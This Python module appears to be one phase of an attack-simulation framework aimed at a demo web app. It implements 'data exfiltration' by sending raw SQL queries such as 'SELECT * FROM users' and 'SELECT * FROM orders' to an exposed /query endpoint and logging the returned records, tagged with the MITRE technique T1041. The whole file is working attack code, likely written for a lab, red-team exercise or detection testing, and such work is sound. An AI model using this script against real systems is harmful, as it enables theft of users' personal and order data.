#!/usr/bin/env python3
"""
Phase 7: Data Exfiltration
Extracts sensitive data from the compromised system via direct SQL endpoint abuse.

MITRE ATT&CK: T1041 — Exfiltration Over C2 Channel
"""

import logging

from .base_attacker import BaseAttacker

logger = logging.getLogger(__name__)


class DataExfiltration(BaseAttacker):
    """Extracts database contents via the exposed /query endpoint."""

    def __init__(self, frontend_url: str = "http://frontend:3000") -> None:
        super().__init__(frontend_url)

    def extract_data(self) -> None:
        """Phase 7: Data Exfiltration — direct SQL query via exposed endpoint."""
        logger.info("\n[DATA EXFILTRATION] Attempting to extract sensitive data...")

        sql_commands = [
            "SELECT * FROM users",
            "SELECT * FROM products",
            "SELECT * FROM orders",
            "SHOW TABLES",
            "SELECT DATABASE()",
        ]

        for sql in sql_commands:
            try:
                response = self.session.post(
                    f"{self.frontend_url}/query",
                    json={"sql": sql},
                    headers={"Content-Type": "application/json"},
                )
                if response.status_code == 200:
                    result = response.json()
                    if result.get("success"):
                        logger.info("✅ SQL Query: %s", sql)
                        logger.info("   Results: %s...", str(result.get("results", "No results"))[:200])
                    else:
                        logger.warning("❌ SQL Query failed: %s", sql)
                else:
                    logger.warning("❌ HTTP %s for query: %s", response.status_code, sql)
            except Exception as e:
                logger.error("❌ SQL Query failed [%s]: %s", sql, e)
